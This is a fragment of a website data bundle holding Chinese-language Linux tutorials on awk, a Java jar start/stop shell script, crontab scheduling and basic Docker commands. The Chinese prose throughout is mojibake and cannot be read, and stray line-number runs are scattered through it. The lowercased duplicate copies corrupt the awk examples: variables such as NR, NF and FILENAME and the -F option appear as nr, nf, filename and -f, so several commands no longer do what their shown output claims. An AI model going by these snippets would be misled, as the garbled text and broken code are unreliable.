æ³è·åå°ä¸ªæ°ç\nPARAM=$#\n\n# åæ°æ ¡éª\ncheck(){\n    if [ $PARAM -ne 2 ]; then\n        echo "run method  $0 start | stop  app_name.jar"\n        exit\n    fi\n}\n\n\n# å¤æ­ç¨åºæ¯å¦è¿è¡ å¦æä¸å­å¨è¿å1ï¼å­å¨è¿å0\nis_exist(){\n    check\n    # grep -v grep å°±æ¯æ¥æ¾ä¸å«æ grep å­æ®µçè¡ï¼é»è®¤ç¬¬ä¸æ¡å½ä»¤ä¼æ¥åºä¸¤è¡æ°æ®ï¼ç¬¬ä¸è¡ä¸è¬æ¯æä»¬æéè¦çï¼ç¬¬äºè¡å°±å±äº grepçæ°æ®\n    # grep æ¯æ¥æ¾å«ææå®ææ¬è¡çææï¼æ¯å¦grep test å°±æ¯æ¥æ¾å«ætestçææ¬çè¡\n    # grep -v æ¯ååæ¥æ¾çææï¼æ¯å¦ grep -v grep å°±æ¯æ¥æ¾ä¸å«æ grep å­æ®µçè¡\n    # $(ps -ef | grep $jarname | grep -v grep) æ¯æ§è¡ä¸ä¸ªå½ä»¤ï¼å¹¶æç»æèµç»pid\n    # awk ç¾åº¦\n    pid=`ps -ef | grep $APP_NAME | grep -v grep | awk \'{print $2}\'`\n    # [ -z STRING ] âSTRINGâ çé¿åº¦ä¸ºé¶åä¸ºçã\n    if [ -z "$pid" ]; then\n        return 1\n    else\n        return 0\n    fi\n}\n\n#å¯å¨æ¹æ³\nstart(){\n    is_exist\n    # %%-* è¡¨ç¤ºä»å³è¾¹å¼å§ï¼å é¤æåï¼æå·¦è¾¹ï¼ç - å·åå³è¾¹çå¤æå­ç¬¦\n    LOG_NAME="${APP_NAME%%-*}.log"\n    # $? æ¯ä¸ä¸ªç¹æ®åéï¼ç¨æ¥è·åä¸ä¸ä¸ªå½ä»¤çéåºç¶æï¼æèä¸ä¸ä¸ªå½æ°çè¿åå¼ã\n    # -eq ç­äº\n    if [ $? -eq 0 ]; then\n        stop\n        start_app\n    else\n        start_app\n    fi\n}\n\nstart_app(){\n    echo "$APP_NAME start..."\n    # 2> è¡¨ç¤ºææ åéè¯¯(stderr)éå®åï¼æ åè¾åº(stdout)æ¯1 2> åé¢å¯ä»¥è·æä»¶åï¼æèæ¯&1, &2ï¼åå«è¡¨ç¤ºéå®åå°æ åè¾åºåæ åéè¯¯ã\n    nohup java -jar $APP_NAME > logs/$LOG_NAME 2>&1 &\n    # å»¶è¿ 1s 1ç§ 1m 1åé 1h 1å°æ¶ 1d 1å¤©\n    sleep 1s;\n    tail -f logs/$LOG_NAME\n}\n\n\n\n# åæ­¢è¿è¡\nstop(){\n    is_exist\n    if [ $? -eq 0 ]; then\n        echo "$APP_NAME is running "\n        kill -9 $pid\n        echo "$APP_NAME is kill ok. pid is $pid"\n    else\n        echo "${APP_NAME} is not running"\n    fi\n}\n\n# å¤æ­åæ°1æ¯å¦ä¸ºç©ºï¼ä¸ºç©ºååè¯æ ååæ³ï¼ä¸ä¸ºç©ºåæåæ°å½æ¹æ³æ§è¡\nif [ ! $1 ]; then\n    echo "run method  $0 start | stop  app_name.jar"\n    exit\nelse\n    $1\nfi\n\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n43\n44\n45\n46\n47\n48\n49\n50\n51\n52\n53\n54\n55\n56\n57\n58\n59\n60\n61\n62\n63\n64\n65\n66\n67\n68\n69\n70\n71\n72\n73\n74\n75\n76\n77\n78\n79\n80\n81\n82\n\n\n> ç¼å shell èæ¬ï¼å½æ°ä¸å®è¦å¨æä¸é¢ï¼å¦åè°ç¨å½æ°ä¼æ¥ command not found',normalizedContent:'awk å½ä»¤æ¯éè¡æ«ææä»¶ï¼ä»ç¬¬ 1 è¡å°æåä¸è¡ï¼ï¼å¯»æ¾å«æç®æ ææ¬çè¡ï¼å¦æå¹éæåï¼åä¼å¨è¯¥è¡ä¸æ§è¡ç¨æ·æ³è¦çæä½ï¼åä¹ï¼åä¸å¯¹è¡åä»»ä½å¤çã\n\n\n# fï¼æå®å­æ®µåéç¬¦ï¼\n\né»è®¤ä½¿ç¨ç©ºæ ¼ä½ä¸ºåéç¬¦ã\n\n[root@localhost awk]# echo "aa bb  cc dd  ee ff" | awk  \'{print $1}\'\naa\n[root@localhost awk]# echo "aa bb l cc dd l ee ff" | awk -f \'l\' \'{print $1}\'\naa bb \n[root@localhost awk]# echo "aa bb  cc : dd  ee ff" | awk -f \':\' \'{print $1}\'\naa bb  cc \n\n\n1\n2\n3\n4\n5\n6\n\n\n\n# fsï¼å­æ®µåéç¬¦ï¼\n\né»è®¤æ¯ç©ºæ ¼åå¶è¡¨ç¬¦ã\n$0 è¡¨ç¤ºå½åæ´è¡åå®¹ï¼$1ï¼$2 è¡¨ç¤ºç¬¬ä¸ä¸ªå­æ®µï¼ç¬¬äºä¸ªå­æ®µ\n\n[root@localhost zabbix_agentd.d]# echo "aa bb cc  dd" | awk \'{ print $0}\'\naa bb cc  dd\n[root@localhost zabbix_agentd.d]# echo "aa bb cc  dd" | awk \'{ print $1}\'\naa\n[root@localhost zabbix_agentd.d]# echo "aa bb cc  dd" | awk \'{ print $2}\'\nbb\n\n\n1\n2\n3\n4\n5\n6\n\n\n\n# nfï¼å½åè¡çå­æ®µä¸ªæ°ï¼\n\nå°±ä»£è¡¨æåä¸ä¸ªå­æ®µï¼(nf-1) ä»£è¡¨åæ°ç¬¬äºä¸ªå­æ®µ\n\n[root@localhost zabbix_agentd.d]# echo "aa bb cc  dd" | awk \'{ print $nf}\'\ndd\n[root@localhost zabbix_agentd.d]# echo "aa bb cc  dd" | awk \'{ print $(nf-1)}\'\ncc\n\n\n1\n2\n3\n4\n\n\n\n# nr (å½åå¤ççæ¯ç¬¬å è¡)\n\næå°å½åè¡å·åå½åææ¬åå®¹\n\n[root@localhost awk]# cat test.txt \naa ss\ndd ff\ngg hh\n[root@localhost awk]# cat test.txt | awk \'{print nr")", $0}\'\n1) aa ss\n2) dd ff\n3) gg hh\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n\n\néå·è¡¨ç¤ºè¾åºçåéä¹é´ç¨ç©ºæ ¼åéï¼\nå³æ¬å·å¿éä½¿ç¨ åå¼å· æå¯ä»¥åæ ·è¾åº\næå°æå®è¡åå®¹ï¼\n\n[root@localhost s17]# java -version \njava version "1.8.0_131"\njava(tm) se runtime environment (build 1.8.0_131-b11)\njava hotspot(tm) 64-bit server vm (build 25.131-b11, mixed mode)\n[root@localhost s17]# java -version 2>&1  | awk \'nr==1 {print $0}\'\njava version "1.8.0_131"\n[root@localhost s17]# \n\n\n1\n2\n3\n4\n5\n6\n7\n\n\n\n# filename (å½åæä»¶å)\n\n[root@localhost awk]#  awk \'{print filename, nr")", $0}\' test.txt \ntest.txt 1) aa ss\ntest.txt 2) dd ff\ntest.txt 3) gg hh\n[root@localhost awk]# cat test.txt | awk \'{print filename, nr")", $0}\'\n- 1) aa ss\n- 2) dd ff\n- 3) gg hh\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n\n\nawk \'{condition action}\' filename è¿ç§å½¢å¼æ¶å¯ä»¥æå°æä»¶åï¼\néè¿ |ï¼ç®¡éç¬¦ï¼è¯»ååå®¹æ¶æå°çæ¯ -\n\n\n# å¶ä»åé\n\nrsï¼è¡åéç¬¦ï¼ç¨äºåå²æ¯ä¸è¡ï¼é»è®¤æ¯æ¢è¡ç¬¦ã\nofsï¼è¾åºå­æ®µçåéç¬¦ï¼ç¨äºæå°æ¶åéå­æ®µï¼é»è®¤ä¸ºç©ºæ ¼ã\norsï¼è¾åºè®°å½çåéç¬¦ï¼ç¨äºæå°æ¶åéè®°å½ï¼é»è®¤ä¸ºæ¢è¡ç¬¦ã\nofmtï¼æ°å­è¾åºçæ ¼å¼ï¼é»è®¤ä¸ºï¼.6gã\n\n\n# print å printf\n\nawk ä¸­åæ¶æä¾äº print å printf ä¸¤ç§æå°è¾åºçå½æ°ã\n\nprint å½æ°ï¼åæ°å¯ä»¥æ¯åéãæ°å¼æèå­ç¬¦ä¸²ãå­ç¬¦ä¸²å¿é¡»ç¨åå¼å·å¼ç¨ï¼åæ°ç¨éå·åéãå¦ææ²¡æéå·ï¼åæ°å°±ä¸²èå¨ä¸èµ·èæ æ³åºåãè¿éï¼éå·çä½ç¨ä¸è¾åºæä»¶çåéç¬¦çä½ç¨æ¯ä¸æ ·çï¼åªæ¯åèæ¯ç©ºæ ¼èå·²ã\n\nprintf å½æ°ï¼å¶ç¨æ³å c è¯­è¨ä¸­ printf åºæ¬ç¸ä¼¼ï¼å¯ä»¥æ ¼å¼åå­ç¬¦ä¸²ï¼è¾åºå¤ææ¶ï¼printf æ´å å¥½ç¨ï¼ä»£ç æ´ææã\n\n\n# å¶ä»å½æ°\n\ntoupper ()ï¼å­ç¬¦è½¬ä¸ºå¤§åã\ntolower ()ï¼å­ç¬¦è½¬ä¸ºå°åã\nlength ()ï¼è¿åå­ç¬¦ä¸²é¿åº¦ã\nsubstr ()ï¼è¿åå­å­ç¬¦ä¸²ã\nsubstr ($1,2)ï¼è¿åç¬¬ä¸ä¸ªå­æ®µï¼ä»ç¬¬ 2 ä¸ªå­ç¬¦å¼å§ä¸ç´å°ç»æã\nsubstr ($1,2,3)ï¼è¿åç¬¬ä¸ä¸ªå­æ®µï¼ä»ç¬¬ 2 ä¸ªå­ç¬¦å¼å§å¼å§åç 3 ä¸ªå­ç¬¦ã\nsin ()ï¼æ­£å¼¦ã\ncos ()ï¼ä½å¼¦ã\nsqrt ()ï¼å¹³æ¹æ ¹ã\nrand ()ï¼éæºæ°ã\n\n[root@localhost awk]# echo "aa bb  cc dd  ee ff" | awk  \'{print toupper($1)}\'\naa\n[root@localhost awk]# echo "aa bb  cc dd  ee ff" | awk  \'{print tolower($2)}\'\nbb\n[root@localhost awk]# echo "aa bb  cc dd  ee ff" | awk  \'{print length($2)}\'\n2\n[root@localhost awk]# echo "asdfghj" | awk \'{print substr($1,2,3)}\'\nsdf\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n\n\n\n# æ¡ä»¶\n\nawk åè®¸æå®è¾åºæ¡ä»¶ï¼åªè¾åºç¬¦åæ¡ä»¶çè¡ã\nawk \' æ¡ä»¶ {å¨ä½}\' æä»¶å\n\n[root@localhost awk]# cat exp.txt \n/stsvc/fms/conf/application.yml\n/stsvc/sms/conf/application.yml\n/stsvc/tms/conf/application.yml\n/root/home/chenfan\n/root/home/jhhuang\n[root@localhost awk]# cat exp.txt | awk \'/stsvc/ {print $0}\'     åå« stsvc çè¡\n/stsvc/fms/conf/application.yml\n/stsvc/sms/conf/application.yml\n/stsvc/tms/conf/application.yml\n[root@localhost awk]# cat exp.txt | awk \'/stsvc\\/fms/ {print $0}\' åå« stsvc/fms çè¡\n/stsvc/fms/conf/application.yml\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n\n\nå¸å°å¼å¤æ­\n\n[root@localhost awk]# cat exp.txt | awk \'nr==2 {print $0}\'ããç­äºç¬¬äºè¡\n/stsvc/sms/conf/application.yml\n[root@localhost awk]# cat exp.txt | awk \'nr>4 {print $0}\'ããå¤§äºç¬¬åè¡\n/root/home/jhhuang\n[root@localhost awk]# cat exp.txt | awk \'nr%2==1 {print $0}\'ããå¥æ°è¡\n/stsvc/fms/conf/application.yml\n/stsvc/tms/conf/application.yml\n/root/home/jhhuang\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n\n\næä¸ªå­æ®µç­äºå·ä½å¼\n\n[root@localhost awk]# cat test.txt \naa ss\ndd ff\ngg hh\n[root@localhost awk]# cat test.txt | awk \' $2=="ff" {print $0}\'\ndd ff\n\n\n1\n2\n3\n4\n5\n6\n\n\nif è¯­å¥\n\n[root@localhost awk]# echo "aa ss dd" | awk \'{ if($3 == "dd") print $0; else print "nothing"}\'\naa ss dd\n[root@localhost awk]# echo "aa ss dds" | awk \'{ if($3 == "dd") print $0; else print "nothing"}\'\nnothing\n\n\n1\n2\n3\n4\n\n\n\n# demo\n\nä»¥ä¸èæ¬å¤å¶ç²è´´å°±å¯ç¨ï¼éè¦å¨ååºç¨åçº§ç®å½æ°å»ºä¸ä¸ª logs æä»¶å¤¹ï¼ä½¿ç¨æ¹æ³ ./ èæ¬.sh start åºç¨åç§°.jarï¼å¶ä¸­ä½¿ç¨äº awk å½ä»¤è§£å³è·å pid é®é¢\n\n#/bin/bash\n\n# è¿éè¯´ä¸ä¸ æç¨ /bin/sh èæ¬éæå°éæ­£å¸¸ æ¢æ /bin/bash å°±å¥½äº\n# éè¿æ§è¡æä»¶è·å¾ è¦è¢«æ§è¡çjar ä¾å¦ ./start.sh test-0.0.1.jar è·åå° test-0.0.1.jar\n# $@è·å¾ææåæ°,$1è·å¾ç¬¬ä¸ä¸ªåæ°\nmathod=$1\napp_name=$2\n# å¨æ¹æ³åç´æ¥ä½¿ç¨æ¯æ æ³è·åå°ä¸ªæ°ç\nparam=$#\n\n# åæ°æ ¡éª\ncheck(){\n    if [ $param -ne 2 ]; then\n        echo "run method  $0 start | stop  app_name.jar"\n        exit\n    fi\n}\n\n\n# å¤æ­ç¨åºæ¯å¦è¿è¡ å¦æä¸å­å¨è¿å1ï¼å­å¨è¿å0\nis_exist(){\n    check\n    # grep -v grep å°±æ¯æ¥æ¾ä¸å«æ grep å­æ®µçè¡ï¼é»è®¤ç¬¬ä¸æ¡å½ä»¤ä¼æ¥åºä¸¤è¡æ°æ®ï¼ç¬¬ä¸è¡ä¸è¬æ¯æä»¬æéè¦çï¼ç¬¬äºè¡å°±å±äº grepçæ°æ®\n    # grep æ¯æ¥æ¾å«ææå®ææ¬è¡çææï¼æ¯å¦grep test å°±æ¯æ¥æ¾å«ætestçææ¬çè¡\n    # grep -v æ¯ååæ¥æ¾çææï¼æ¯å¦ grep -v grep å°±æ¯æ¥æ¾ä¸å«æ grep å­æ®µçè¡\n    # $(ps -ef | grep $jarname | grep -v grep) æ¯æ§è¡ä¸ä¸ªå½ä»¤ï¼å¹¶æç»æèµç»pid\n    # awk ç¾åº¦\n    pid=`ps -ef | grep $app_name | grep -v grep | awk \'{print $2}\'`\n    # [ -z string ] âstringâ çé¿åº¦ä¸ºé¶åä¸ºçã\n    if [ -z "$pid" ]; then\n        return 1\n    else\n        return 0\n    fi\n}\n\n#å¯å¨æ¹æ³\nstart(){\n    is_exist\n    # %%-* è¡¨ç¤ºä»å³è¾¹å¼å§ï¼å é¤æåï¼æå·¦è¾¹ï¼ç - å·åå³è¾¹çå¤æå­ç¬¦\n    log_name="${app_name%%-*}.log"\n    # $? æ¯ä¸ä¸ªç¹æ®åéï¼ç¨æ¥è·åä¸ä¸ä¸ªå½ä»¤çéåºç¶æï¼æèä¸ä¸ä¸ªå½æ°çè¿åå¼ã\n    # -eq ç­äº\n    if [ $? -eq 0 ]; then\n        stop\n        start_app\n    else\n        start_app\n    fi\n}\n\nstart_app(){\n    echo "$app_name start..."\n    # 2> è¡¨ç¤ºææ åéè¯¯(stderr)éå®åï¼æ åè¾åº(stdout)æ¯1 2> åé¢å¯ä»¥è·æä»¶åï¼æèæ¯&1, &2ï¼åå«è¡¨ç¤ºéå®åå°æ åè¾åºåæ åéè¯¯ã\n    nohup java -jar $app_name > logs/$log_name 2>&1 &\n    # å»¶è¿ 1s 1ç§ 1m 1åé 1h 1å°æ¶ 1d 1å¤©\n    sleep 1s;\n    tail -f logs/$log_name\n}\n\n\n\n# åæ­¢è¿è¡\nstop(){\n    is_exist\n    if [ $? -eq 0 ]; then\n        echo "$app_name is running "\n        kill -9 $pid\n        echo "$app_name is kill ok. pid is $pid"\n    else\n        echo "${app_name} is not running"\n    fi\n}\n\n# å¤æ­åæ°1æ¯å¦ä¸ºç©ºï¼ä¸ºç©ºååè¯æ ååæ³ï¼ä¸ä¸ºç©ºåæåæ°å½æ¹æ³æ§è¡\nif [ ! $1 ]; then\n    echo "run method  $0 start | stop  app_name.jar"\n    exit\nelse\n    $1\nfi\n\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n43\n44\n45\n46\n47\n48\n49\n50\n51\n52\n53\n54\n55\n56\n57\n58\n59\n60\n61\n62\n63\n64\n65\n66\n67\n68\n69\n70\n71\n72\n73\n74\n75\n76\n77\n78\n79\n80\n81\n82\n\n\n> ç¼å shell èæ¬ï¼å½æ°ä¸å®è¦å¨æä¸é¢ï¼å¦åè°ç¨å½æ°ä¼æ¥ command not found',charsets:{cjk:!0}},{title:"Linux å®æ¶ä»»å¡",frontmatter:{title:"Linux å®æ¶ä»»å¡",date:"2023-06-25T09:22:36.000Z",permalink:"/linux/2303",sidebar:!0,article:!1,comment:!1,editLink:!1},regularPath:"/04.%E8%BF%90%E7%BB%B4/2300.linux/2303.Linux%20%E5%AE%9A%E6%97%B6%E4%BB%BB%E5%8A%A1.html",relativePath:"04.è¿ç»´/2300.linux/2303.Linux å®æ¶ä»»å¡.md",key:"v-827e00c2",path:"/linux/2303/",lastUpdated:"12/24/2024, 6:15:06 PM",lastUpdatedTimestamp:1735035306e3,headersStr:null,content:"crontab å½ä»¤ è¢«ç¨æ¥æäº¤åç®¡çç¨æ·çéè¦å¨ææ§æ§è¡çä»»å¡ï¼ä¸ windows ä¸çè®¡åä»»å¡ç±»ä¼¼ï¼å½å®è£å®ææä½ç³»ç»åï¼é»è®¤ä¼å®è£æ­¤æå¡å·¥å·ï¼å¹¶ä¸ä¼èªå¨å¯å¨ crond è¿ç¨ï¼crond è¿ç¨æ¯åéä¼å®ææ£æ¥æ¯å¦æè¦æ§è¡çä»»å¡ï¼å¦ææè¦æ§è¡çä»»å¡ï¼åèªå¨æ§è¡è¯¥ä»»å¡ã\n\ncrontab -e : ä¿®æ¹ crontab æä»¶. å¦ææä»¶ä¸å­å¨ä¼èªå¨åå»ºã \ncrontab -l : æ¾ç¤º crontab æä»¶ã \ncrontab -r : å é¤ crontab æä»¶ã\ncrontab -ir : å é¤ crontab æä»¶åæéç¨æ·ã\n\n\n1\n2\n3\n4\n\n\n{minute} {hour} {day-of-month} {month} {day-of-week} {full-path-to-shell-script} \no minute: åºé´ä¸º 0 â 59 \no hour: åºé´ä¸º0 â 23 \no day-of-month: åºé´ä¸º0 â 31 \no month: åºé´ä¸º1 â 12. 1 æ¯1æ. 12æ¯12æ. \no Day-of-week: åºé´ä¸º0 â 7. å¨æ¥å¯ä»¥æ¯0æ7.\n\n1ãå¨ åæ¨00:01è¿è¡\n1 0 * * * /home/linrui/XXXX.sh\n2ãæ¯ä¸ªå·¥ä½æ¥23:59é½è¿è¡å¤ä»½ä½ä¸ã\n59 11 * * 1-5 /home/linrui/XXXX.sh\n3ãæ¯åéè¿è¡ä¸æ¬¡å½ä»¤\n*/1 * * * * /home/linrui/XXXX.sh\n4ãæ¯ä¸ªæç1å· 14:10 è¿è¡\n10 14 1 * * /home/linrui/XXXX.sh\n\næå·ï¼*ï¼ï¼ä»£è¡¨ææå¯è½çå¼ï¼ä¾å¦monthå­æ®µå¦ææ¯æå·ï¼åè¡¨ç¤ºå¨æ»¡è¶³å¶å®å­æ®µçå¶çº¦æ¡ä»¶åæ¯æé½æ§è¡è¯¥å½ä»¤æä½ã\n éå·ï¼,ï¼ï¼å¯ä»¥ç¨éå·éå¼çå¼æå®ä¸ä¸ªåè¡¨èå´ï¼ä¾å¦ï¼â1,2,5,7,8,9â\nä¸­æ ï¼-ï¼ï¼å¯ä»¥ç¨æ´æ°ä¹é´çä¸­æ è¡¨ç¤ºä¸ä¸ªæ´æ°èå´ï¼ä¾å¦â2-6âè¡¨ç¤ºâ2,3,4,5,6â\næ­£æçº¿ï¼/ï¼ï¼å¯ä»¥ç¨æ­£æçº¿æå®æ¶é´çé´éé¢çï¼ä¾å¦â0-23/2âè¡¨ç¤ºæ¯ä¸¤å°æ¶æ§è¡ä¸æ¬¡ã\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n\n\nä¹å¯ä»¥è¿å¥ vim /etc/crontab (Linux ç³»ç»ä¸­ç¨äºéç½® cron ä»»å¡çæä»¶) ç´æ¥æä½æä»¶",normalizedContent:"crontab å½ä»¤ è¢«ç¨æ¥æäº¤åç®¡çç¨æ·çéè¦å¨ææ§æ§è¡çä»»å¡ï¼ä¸ windows ä¸çè®¡åä»»å¡ç±»ä¼¼ï¼å½å®è£å®ææä½ç³»ç»åï¼é»è®¤ä¼å®è£æ­¤æå¡å·¥å·ï¼å¹¶ä¸ä¼èªå¨å¯å¨ crond è¿ç¨ï¼crond è¿ç¨æ¯åéä¼å®ææ£æ¥æ¯å¦æè¦æ§è¡çä»»å¡ï¼å¦ææè¦æ§è¡çä»»å¡ï¼åèªå¨æ§è¡è¯¥ä»»å¡ã\n\ncrontab -e : ä¿®æ¹ crontab æä»¶. å¦ææä»¶ä¸å­å¨ä¼èªå¨åå»ºã \ncrontab -l : æ¾ç¤º crontab æä»¶ã \ncrontab -r : å é¤ crontab æä»¶ã\ncrontab -ir : å é¤ crontab æä»¶åæéç¨æ·ã\n\n\n1\n2\n3\n4\n\n\n{minute} {hour} {day-of-month} {month} {day-of-week} {full-path-to-shell-script} \no minute: åºé´ä¸º 0 â 59 \no hour: åºé´ä¸º0 â 23 \no day-of-month: åºé´ä¸º0 â 31 \no month: åºé´ä¸º1 â 12. 1 æ¯1æ. 12æ¯12æ. \no day-of-week: åºé´ä¸º0 â 7. å¨æ¥å¯ä»¥æ¯0æ7.\n\n1ãå¨ åæ¨00:01è¿è¡\n1 0 * * * /home/linrui/xxxx.sh\n2ãæ¯ä¸ªå·¥ä½æ¥23:59é½è¿è¡å¤ä»½ä½ä¸ã\n59 11 * * 1-5 /home/linrui/xxxx.sh\n3ãæ¯åéè¿è¡ä¸æ¬¡å½ä»¤\n*/1 * * * * /home/linrui/xxxx.sh\n4ãæ¯ä¸ªæç1å· 14:10 è¿è¡\n10 14 1 * * /home/linrui/xxxx.sh\n\næå·ï¼*ï¼ï¼ä»£è¡¨ææå¯è½çå¼ï¼ä¾å¦monthå­æ®µå¦ææ¯æå·ï¼åè¡¨ç¤ºå¨æ»¡è¶³å¶å®å­æ®µçå¶çº¦æ¡ä»¶åæ¯æé½æ§è¡è¯¥å½ä»¤æä½ã\n éå·ï¼,ï¼ï¼å¯ä»¥ç¨éå·éå¼çå¼æå®ä¸ä¸ªåè¡¨èå´ï¼ä¾å¦ï¼â1,2,5,7,8,9â\nä¸­æ ï¼-ï¼ï¼å¯ä»¥ç¨æ´æ°ä¹é´çä¸­æ è¡¨ç¤ºä¸ä¸ªæ´æ°èå´ï¼ä¾å¦â2-6âè¡¨ç¤ºâ2,3,4,5,6â\næ­£æçº¿ï¼/ï¼ï¼å¯ä»¥ç¨æ­£æçº¿æå®æ¶é´çé´éé¢çï¼ä¾å¦â0-23/2âè¡¨ç¤ºæ¯ä¸¤å°æ¶æ§è¡ä¸æ¬¡ã\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n\n\nä¹å¯ä»¥è¿å¥ vim /etc/crontab (linux ç³»ç»ä¸­ç¨äºéç½® cron ä»»å¡çæä»¶) ç´æ¥æä½æä»¶",charsets:{cjk:!0}},{title:"Docker æ¦å¿µãå½ä»¤åDockerfileä»ç»",frontmatter:{title:"Docker æ¦å¿µãå½ä»¤åDockerfileä»ç»",date:"2023-06-25T09:22:36.000Z",permalink:"/docker/400",sidebar:!0,article:!1,comment:!1,editLink:!1},regularPath:"/04.%E8%BF%90%E7%BB%B4/40.Docker/400.Docker%20%E6%A6%82%E5%BF%B5%E3%80%81%E5%91%BD%E4%BB%A4%E5%8F%8ADockerfile%E4%BB%8B%E7%BB%8D.html",relativePath:"04.è¿ç»´/40.Docker/400.Docker æ¦å¿µãå½ä»¤åDockerfileä»ç».md",key:"v-775a7bcf",path:"/docker/400/",headers:[{level:2,title:"1.dockerçæå¿µï¼dockeræ¯ä»ä¹",slug:"_1-dockerçæå¿µ-dockeræ¯ä»ä¹",normalizedTitle:"1.docker çæå¿µï¼docker æ¯ä»ä¹",charIndex:2},{level:2,title:"2.dockeråºç¡å½ä»¤",slug:"_2-dockeråºç¡å½ä»¤",normalizedTitle:"2.docker åºç¡å½ä»¤",charIndex:228},{level:2,title:"3.ä¿®æ¹å·²ç»å­å¨å®¹å¨çç«¯å£",slug:"_3-ä¿®æ¹å·²ç»å­å¨å®¹å¨çç«¯å£",normalizedTitle:"3. ä¿®æ¹å·²ç»å­å¨å®¹å¨çç«¯å£",charIndex:1900},{level:2,title:"4.å¶ä½éåçåºæ¬å½ä»¤",slug:"_4-å¶ä½éåçåºæ¬å½ä»¤",normalizedTitle:"4. å¶ä½éåçåºæ¬å½ä»¤",charIndex:2414},{level:3,title:"æ¦å¿µ",slug:"æ¦å¿µ",normalizedTitle:"æ¦å¿µ",charIndex:2431},{level:3,title:"å½ä»¤",slug:"å½ä»¤",normalizedTitle:"å½ä»¤",charIndex:239},{level:3,title:"éç½®Ideaè¿æ¥Docker",slug:"éç½®ideaè¿æ¥docker",normalizedTitle:"éç½® idea è¿æ¥ docker",charIndex:4504},{level:3,title:"å®ææå»ºSpringBootåºç¨",slug:"å®ææå»ºspringbootåºç¨",normalizedTitle:"å®ææå»º springboot åºç¨",charIndex:4716},{level:2,title:"5. Docker ä½¿ç¨é¿éäºä»åºæèªå»ºä»åº",slug:"_5-docker-ä½¿ç¨é¿éäºä»åºæèªå»ºä»åº",normalizedTitle:"5. docker ä½¿ç¨é¿éäºä»åºæèªå»ºä»åº",charIndex:5697},{level:3,title:"é¿éäºä»åº",slug:"é¿éäºä»åº",normalizedTitle:"é¿éäºä»åº",charIndex:5709},{level:3,title:"èªå»ºä»åº",slug:"èªå»ºä»åº",normalizedTitle:"èªå»ºä»åº",charIndex:5715},{level:2,title:"6. ä¸ä¼ DockerHub",slug:"_6-ä¸ä¼ dockerhub",normalizedTitle:"6. ä¸ä¼  dockerhub",charIndex:6101}],lastUpdated:"12/24/2024, 6:15:06 PM",lastUpdatedTimestamp:1735035306e3,headersStr:"1.dockerçæå¿µï¼dockeræ¯ä»ä¹ 2.dockeråºç¡å½ä»¤ 3.ä¿®æ¹å·²ç»å­å¨å®¹å¨çç«¯å£ 4.å¶ä½éåçåºæ¬å½ä»¤ æ¦å¿µ å½ä»¤ éç½®Ideaè¿æ¥Docker å®ææå»ºSpringBootåºç¨ 5. Docker ä½¿ç¨é¿éäºä»åºæèªå»ºä»åº é¿éäºä»åº èªå»ºä»åº 6. ä¸ä¼ DockerHub",content:'# 1.docker çæå¿µï¼docker æ¯ä»ä¹\n\ndocker åä¸ºä¸ç§æå¿µï¼éå å®¹å¨ ä»åº\néåï¼ç±»ä¼¼äºä¸ä¸ªæ¨¡æ¿ï¼éé¢åå«äºä¸äºåå®¹\nå®¹å¨ï¼å®¹å¨æ¯ä¸ä¸ªéåçå®ä¾ï¼å¦æçè§£éåä¸ºä¸ä¸ª classï¼é£ä¹å®¹å¨å°±è¢«çè§£ä¸ºæ¯ new class (); æ¯éåçå®ä¾\nä»åºï¼å°±æ¯ä¸è½½éåèµæºçå°æ¹ã\ndocker å®¹å¨ä¸æ¯èææºï¼å®¹å¨å¯ä»¥è¯´æ¯ä¸ä¸ªè¿ç¨ï¼æä»¬å¯ä»¥ç»å®¹å¨åéåå­ãå°±å windows å®è£äºèææºï¼å¯ä»¥ç»èææºåéåå­å¤§å°ï¼ç£çç©ºé´ã\n\n\n# 2.docker åºç¡å½ä»¤\n\næç´¢éåï¼ä» maven ä»åºä¸­æ¥è¯¢\n\ndocker search mysql\n\n\n1\n\n\nååºå½åç³»ç»å­å¨çéå\n\ndocker images\n\n\n1\n\n\nç»éåæ´æ¢åç§°\n\ndocker tag imageId repository:tag\n\n\n1\n\n\nå é¤éå (-f å¼ºå¶) å¿é¡»ç¥ééåç imageId\n\ndocker rmi -f imageId\n\n\n1\n\n\nrepository:tag (éåçä»åºæºï¼éåçæ ç­¾) æå\n\ndocker pull repository:tag\n\n\n1\n\n\nè¿è¡ä¸ä¸ªå®¹å¨\n\ndocker run -it  -d --name "xxx" -p port1:port2 -p port3:port4 -v home/data:/data repository:tag \n\n\n1\n\n * runï¼è¿è¡å®¹å¨å½ä»¤\n * -itï¼è¿è¡åç´æ¥ä¸ç»ç«¯äº¤äºï¼æ¯å¦è¿è¡ jar æå¶ä»åºç¨çæ¶å æ¥çä»ä»¬çå¯å¨ä¿¡æ¯\n * -dï¼åå°è¿è¡\n * -p port1:port2ï¼ç«¯å£æ å° port1 (å®¿ä¸»æº) port2 (å®¹å¨) å®¹å¨çç«¯å£æ¯å¯ä»¥éå¤çï¼æä»¥å®¹å¨åç©çæºçç«¯å£å¯ä»¥ä¸è´ãrabbitmq æä¸¤ä¸ªç«¯å£ 5672 å 15672 æä»¥ä¼ç¨å°å -p repository:tag -> å¦æä¸æå® tagï¼é»è®¤ä½¿ç¨ææ°ç\n * --name "xxx"ï¼æå®å®¹å¨åç§°\n * -v /home/data:/dataï¼/home/data (å®¿ä¸»æº):/data (å®¹å¨) æ¬å°å°ååå®¹å¨å°åäº§çæè½½å³ç³»ï¼ å¨å®¹å¨åé¨è¯¥ç®å½ä¸ï¼æèå®¿ä¸»æºå